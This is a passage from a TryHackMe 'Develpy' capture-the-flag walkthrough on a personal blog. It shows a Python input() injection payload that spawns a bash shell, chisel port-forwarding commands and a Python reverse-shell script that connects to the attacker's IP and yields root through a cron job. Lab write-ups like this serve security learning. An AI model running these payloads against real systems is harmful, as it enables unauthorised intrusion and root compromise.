</code></pre></div><br><p>Sending <code>2</code>, we can see that it&rsquo;s pinging <a href=http://tryhackme.com>tryhackme.com</a> host against the number two times (because of 2?). Let&rsquo;s try passing <code>2+2</code> and see if it <strong>evaluates</strong> that (to 4)?</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>â”Œâ”€â”€<span style=color:#f92672>(</span>rootðŸ’€b0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/THM/Develpy<span style=color:#f92672>]</span>
â””â”€# nc 10.10.36.158 <span style=color:#ae81ff>10000</span>

        Private 0days

 Please enther number of exploits to send??: 2+2

Exploit started, attacking target <span style=color:#f92672>(</span>tryhackme.com<span style=color:#f92672>)</span>...
Exploiting tryhackme internal network: beacons_seq<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> ttl<span style=color:#f92672>=</span><span style=color:#ae81ff>1337</span> time<span style=color:#f92672>=</span>0.034 ms
Exploiting tryhackme internal network: beacons_seq<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span> ttl<span style=color:#f92672>=</span><span style=color:#ae81ff>1337</span> time<span style=color:#f92672>=</span>0.088 ms
Exploiting tryhackme internal network: beacons_seq<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span> ttl<span style=color:#f92672>=</span><span style=color:#ae81ff>1337</span> time<span style=color:#f92672>=</span>0.014 ms
Exploiting tryhackme internal network: beacons_seq<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span> ttl<span style=color:#f92672>=</span><span style=color:#ae81ff>1337</span> time<span style=color:#f92672>=</span>0.019 ms
</code></pre></div><br><p>Awesome! <code>4</code> tries now! Maybe try something like <strong>printing</strong> something?</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>â”Œâ”€â”€<span style=color:#f92672>(</span>rootðŸ’€b0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/THM/Develpy<span style=color:#f92672>]</span>
â””â”€# nc 10.10.36.158 <span style=color:#ae81ff>10000</span>

        Private 0days

 Please enther number of exploits to send??: print<span style=color:#f92672>(</span>1<span style=color:#f92672>)</span>
Traceback <span style=color:#f92672>(</span>most recent call last<span style=color:#f92672>)</span>:
  File <span style=color:#e6db74>&#34;./exploit.py&#34;</span>, line 6, in &lt;module&gt;
    num_exploits <span style=color:#f92672>=</span> int<span style=color:#f92672>(</span>input<span style=color:#f92672>(</span><span style=color:#e6db74>&#39; Please enther number of exploits to send??: &#39;</span><span style=color:#f92672>))</span>
  File <span style=color:#e6db74>&#34;&lt;string&gt;&#34;</span>, line <span style=color:#ae81ff>1</span>
    print<span style=color:#f92672>(</span>1<span style=color:#f92672>)</span>
        ^
SyntaxError: invalid syntax
</code></pre></div><br><p>Passing that, we get the above error^ Let&rsquo;s try passing a string:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>â”Œâ”€â”€<span style=color:#f92672>(</span>rootðŸ’€b0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/THM/Develpy<span style=color:#f92672>]</span>
â””â”€# nc 10.10.36.158 <span style=color:#ae81ff>10000</span>

        Private 0days

 Please enther number of exploits to send??: test
Traceback <span style=color:#f92672>(</span>most recent call last<span style=color:#f92672>)</span>:
  File <span style=color:#e6db74>&#34;./exploit.py&#34;</span>, line 6, in &lt;module&gt;
    num_exploits <span style=color:#f92672>=</span> int<span style=color:#f92672>(</span>input<span style=color:#f92672>(</span><span style=color:#e6db74>&#39; Please enther number of exploits to send??: &#39;</span><span style=color:#f92672>))</span>
  File <span style=color:#e6db74>&#34;&lt;string&gt;&#34;</span>, line 1, in &lt;module&gt;
NameError: name <span style=color:#e6db74>&#39;test&#39;</span> is not defined
</code></pre></div><br><p>The error <code>"NameError: name 'test' is not defined"</code> only occurs when some module or variable is being called! Let&rsquo;s try and <code>import</code> a module?</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>â”Œâ”€â”€<span style=color:#f92672>(</span>rootðŸ’€b0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/THM/Develpy<span style=color:#f92672>]</span>
â””â”€# nc 10.10.36.158 <span style=color:#ae81ff>10000</span>

        Private 0days

 Please enther number of exploits to send??: import os
Traceback <span style=color:#f92672>(</span>most recent call last<span style=color:#f92672>)</span>:
  File <span style=color:#e6db74>&#34;./exploit.py&#34;</span>, line 6, in &lt;module&gt;
    num_exploits <span style=color:#f92672>=</span> int<span style=color:#f92672>(</span>input<span style=color:#f92672>(</span><span style=color:#e6db74>&#39; Please enther number of exploits to send??: &#39;</span><span style=color:#f92672>))</span>
  File <span style=color:#e6db74>&#34;&lt;string&gt;&#34;</span>, line <span style=color:#ae81ff>1</span>
    import os
         ^
SyntaxError: invalid syntax
</code></pre></div><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>Most probably <code>spaces</code> are the issue here! Let&rsquo;s try and import the module <code>pty</code> without spaces and call its method <code>spawn</code> to <code>spawn</code> a <code>/bin/bash</code> shell. We can find a <a href=https://stackoverflow.com/a/9123555>guide here</a> to do so.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>__import__(<span style=color:#e6db74>&#39;pty&#39;</span>)<span style=color:#f92672>.</span>spawn(<span style=color:#e6db74>&#34;/bin/bash&#34;</span>)
</code></pre></div><br>Let's send it to the `server`:<br><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span>(root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x)<span style=color:#f92672>-</span>[<span style=color:#f92672>~/</span>THM<span style=color:#f92672>/</span>Develpy]
<span style=color:#960050;background-color:#1e0010>â””â”€</span><span style=color:#75715e># nc 10.10.36.158 10000</span>

        Private <span style=color:#ae81ff>0</span>days

 Please enther number of exploits to send<span style=color:#960050;background-color:#1e0010>??</span>: __import__(<span style=color:#e6db74>&#39;pty&#39;</span>)<span style=color:#f92672>.</span>spawn(<span style=color:#e6db74>&#34;/bin/bash&#34;</span>)
king<span style=color:#a6e22e>@ubuntu</span>:<span style=color:#f92672>~</span><span style=color:#960050;background-color:#1e0010>$</span> id
id
uid<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span>(king) gid<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span>(king) groups<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span>(king),<span style=color:#ae81ff>4</span>(adm),<span style=color:#ae81ff>24</span>(cdrom),<span style=color:#ae81ff>30</span>(dip),<span style=color:#ae81ff>46</span>(plugdev),<span style=color:#ae81ff>114</span>(lpadmin),<span style=color:#ae81ff>115</span>(sambashare)
</code></pre></div><br>Awesome! We've gotten the `initial` shell as user **king**.<p><img loading=lazy src=/images/tryhackme-develpy/Untitled.png alt></p><h2 id=privileges-escalation>Privileges Escalation<a hidden class=anchor aria-hidden=true href=#privileges-escalation>#</a></h2><p>Now, for privileges escalation, we can see 2 <code>.sh</code> files in the user directory. Let&rsquo;s go through their contents:</p><p><strong>root.sh</strong></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>king@ubuntu:~$ cat root.sh
python /root/company/media/*.py
</code></pre></div><p><strong>run.sh</strong></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>king@ubuntu:~$ cat run.sh
<span style=color:#75715e>#!/bin/bash</span>
kill cat /home/king/.pid
socat TCP-LISTEN:10000,reuseaddr,fork EXEC:./exploit.py,pty,stderr,echo<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span> &amp;
echo $! &gt; /home/king/.pid
</code></pre></div><br><p>Alright, so <a href=http://root.sh>root.sh</a> is <em>owned and</em> <em>only readable/writeable by root</em> while <em>we can read/write to <a href=http://run.sh>run.sh</a></em> which is no good since it is the <code>server</code> which was calling the <code>python service</code> we exploited to get the <code>interactive shell</code>.</p><p><strong>Enumerating more</strong>, we can see the <code>cronjobs</code> in the machine:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>king@ubuntu:~$ cat /etc/crontab
<span style=color:#75715e># /etc/crontab: system-wide crontab</span>
<span style=color:#75715e># Unlike any other crontab you don&#39;t have to run the `crontab&#39;</span>
<span style=color:#75715e># command to install the new version when you edit this file</span>
<span style=color:#75715e># and files in /etc/cron.d. These files also have username fields,</span>
<span style=color:#75715e># that none of the other crontabs do.</span>

SHELL<span style=color:#f92672>=</span>/bin/sh
PATH<span style=color:#f92672>=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

<span style=color:#75715e># m h dom mon dow user  command</span>
<span style=color:#ae81ff>17</span> *    * * *   root    cd / <span style=color:#f92672>&amp;&amp;</span> run-parts --report /etc/cron.hourly
<span style=color:#ae81ff>25</span> <span style=color:#ae81ff>6</span>    * * *   root    test -x /usr/sbin/anacron <span style=color:#f92672>||</span> <span style=color:#f92672>(</span> cd / <span style=color:#f92672>&amp;&amp;</span> run-parts --report /etc/cron.daily <span style=color:#f92672>)</span>
<span style=color:#ae81ff>47</span> <span style=color:#ae81ff>6</span>    * * <span style=color:#ae81ff>7</span>   root    test -x /usr/sbin/anacron <span style=color:#f92672>||</span> <span style=color:#f92672>(</span> cd / <span style=color:#f92672>&amp;&amp;</span> run-parts --report /etc/cron.weekly <span style=color:#f92672>)</span>
<span style=color:#ae81ff>52</span> <span style=color:#ae81ff>6</span>    <span style=color:#ae81ff>1</span> * *   root    test -x /usr/sbin/anacron <span style=color:#f92672>||</span> <span style=color:#f92672>(</span> cd / <span style=color:#f92672>&amp;&amp;</span> run-parts --report /etc/cron.monthly <span style=color:#f92672>)</span>
*  *    * * *   king    cd /home/king/ <span style=color:#f92672>&amp;&amp;</span> bash run.sh
*  *    * * *   root    cd /home/king/ <span style=color:#f92672>&amp;&amp;</span> bash root.sh
*  *    * * *   root    cd /root/company <span style=color:#f92672>&amp;&amp;</span> bash run.sh
<span style=color:#75715e>#</span>
</code></pre></div><br><p>We can see that <a href=http://run.sh>**run.sh</a> is being run as king** while <a href=http://root.sh>**root.sh</a> in our directory and run.sh in root user&rsquo;s company directory is being called by user root**. But how to access those? We don&rsquo;t have read access to /root/ either!</p><p><strong>Enumerating</strong> <strong>even more</strong>, we can see that there&rsquo;s a <code>port 8080/tcp</code> listening locally:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>king@ubuntu:~$ netstat -plnt
<span style=color:#f92672>(</span>Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.<span style=color:#f92672>)</span>
Active Internet connections <span style=color:#f92672>(</span>only servers<span style=color:#f92672>)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 127.0.0.1:8080          0.0.0.0:*               LISTEN      -               
tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 0.0.0.0:10000           0.0.0.0:*               LISTEN      756/socat       
tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> :::22                   :::*                    LISTEN      -               
</code></pre></div><br><p>Cool, we can forward this port to our host and access it using <code>chisel</code>. Let&rsquo;s do it!</p><p>I&rsquo;ll leave the <strong>downloading and pushing</strong> of <code>chisel</code> binary to you. We&rsquo;ll need a <em>local copy</em> of <code>chisel</code> on our host (<code>attcker</code>) <em>depending on our OS</em> and a copy of <code>chisel</code> <em>compiled for x64 for the server</em> (<code>victim</code>).</p><p><strong>Victim:</strong></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>king@ubuntu:~$ ./chisel-umar0x01 server -p <span style=color:#ae81ff>47000</span> 
</code></pre></div><p><strong>Attacker:</strong></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>â”Œâ”€â”€<span style=color:#f92672>(</span>rootðŸ’€b0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>/var/www/html<span style=color:#f92672>]</span>
â””â”€# ./chisel-umar0x01 client 10.10.36.158:47000 2222:127.0.0.1:8080                                                                                                                                          <span style=color:#ae81ff>130</span> â¨¯
</code></pre></div><br><p>Awesome, let&rsquo;s run and see if our <code>connection establishes</code>.</p><p><img loading=lazy src=/images/tryhackme-develpy/Untitled%201.png alt></p><p>Cool, <strong>the port is forwarded</strong>, let' try accessing it locally at <code>127.0.0.1:2222</code></p><p><img loading=lazy src=/images/tryhackme-develpy/Untitled%202.png alt><br>We&rsquo;ve a <strong>upload page here</strong>, <em><strong>remember the contents of <a href=http://root.sh>root.sh</a> file in our directory</strong></em>? It was calling <code>*.py</code> files from <code>**root user's media directory**</code>, maybe we can upload our <code>.py</code> file here and get <code>reverse shell</code> as <code>root user</code>? Let&rsquo;s try that!</p><p>I&rsquo;ll first add the following in my local python file for reverse shell:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>â”Œâ”€â”€<span style=color:#f92672>(</span>rootðŸ’€b0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/THM/Develpy<span style=color:#f92672>]</span>
â””â”€# cat &gt; test.py        
import socket,subprocess,os
s<span style=color:#f92672>=</span>socket.socket<span style=color:#f92672>(</span>socket.AF_INET,socket.SOCK_STREAM<span style=color:#f92672>)</span>
s.connect<span style=color:#f92672>((</span><span style=color:#e6db74>&#34;10.17.0.120&#34;</span>,4444<span style=color:#f92672>))</span>
os.dup2<span style=color:#f92672>(</span>s.fileno<span style=color:#f92672>()</span>,0<span style=color:#f92672>)</span>
os.dup2<span style=color:#f92672>(</span>s.fileno<span style=color:#f92672>()</span>,1<span style=color:#f92672>)</span>
os.dup2<span style=color:#f92672>(</span>s.fileno<span style=color:#f92672>()</span>,2<span style=color:#f92672>)</span>
p<span style=color:#f92672>=</span>subprocess.call<span style=color:#f92672>([</span><span style=color:#e6db74>&#34;/bin/bash&#34;</span>,<span style=color:#e6db74>&#34;-i&#34;</span><span style=color:#f92672>])</span>
</code></pre></div><p>Let&rsquo;s <code>upload</code> the <a href=http://test.py>test.py</a> file now to the server:</p><p><img loading=lazy src=/images/tryhackme-develpy/Untitled%203.png alt></p><p>Let&rsquo;s <code>start the local listener</code> and wait for a minute:</p><p><img loading=lazy src=/images/tryhackme-develpy/Untitled%204.png alt></p><p>Awesome! `<strong>We&rsquo;re root</strong>! Thanks for reading the walkthrough. Hopefully you enjoyed it ðŸ¥‚</p><hr><h3 id=todos-things-learnt>Todos (Things learnt):<a hidden class=anchor aria-hidden=true href=#todos-things-learnt>#</a></h3><ul><li>Enumerate manually before running any noisy local enumeration tool</li><li>Think outside the box</li><li>Never hesitate to forward ports (thinking it&rsquo;ll take time)!</li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://umar0x01.sh/tags/ssh/>ssh</a></li><li><a href=https://umar0x01.sh/tags/python/>python</a></li><li><a href=https://umar0x01.sh/tags/python-input/>python-input</a></li><li><a href=https://umar0x01.sh/tags/cronjobs/>cronjobs</a></li><li><a href=https://umar0x01.sh/tags/bash/>bash</a></li><li><a href=https://umar0x01.sh/tags/port-forwarding/>port-forwarding</a></li><li><a href=https://umar0x01.sh/tags/file-upload/>file-upload</a></li><li><a href=https://umar0x01.sh/tags/python-shell/>python-shell</a></li></ul><nav class=paginav><a class=next href=https://umar0x01.sh/post/overpass-tryhackme/><span class=title>Next Page Â»</span><br><span>TryHackMe - Overpass</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Develpy on twitter" href="https://twitter.com/intent/tweet/?text=TryHackMe%20-%20Develpy&url=https%3a%2f%2fumar0x01.sh%2fpost%2ftryhackme-develpy%2f&hashtags=ssh%2cpython%2cpython-input%2ccronjobs%2cbash%2cport-forwarding%2cfile-upload%2cpython-shell"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Develpy on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fumar0x01.sh%2fpost%2ftryhackme-develpy%2f&title=TryHackMe%20-%20Develpy&summary=TryHackMe%20-%20Develpy&source=https%3a%2f%2fumar0x01.sh%2fpost%2ftryhackme-develpy%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Develpy on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fumar0x01.sh%2fpost%2ftryhackme-develpy%2f&title=TryHackMe%20-%20Develpy"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Develpy on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fumar0x01.sh%2fpost%2ftryhackme-develpy%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Develpy on whatsapp" href="https://api.whatsapp.com/send?text=TryHackMe%20-%20Develpy%20-%20https%3a%2f%2fumar0x01.sh%2fpost%2ftryhackme-develpy%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Develpy on telegram" href="https://telegram.me/share/url?text=TryHackMe%20-%20Develpy&url=https%3a%2f%2fumar0x01.sh%2fpost%2ftryhackme-develpy%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2021 <a href=https://twitter.com/syed__umar target=_blank>@syed__umar</a></span>
<span>&#183;</span>
<span>Powered by <a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>window.onload=function(){localStorage.getItem("menu-scroll-position")&&(document.getElementById('menu').scrollLeft=localStorage.getItem("menu-scroll-position"))};function menu_on_scroll(){localStorage.setItem("menu-scroll-position",document.getElementById('menu').scrollLeft)}document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script><script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script></body></html>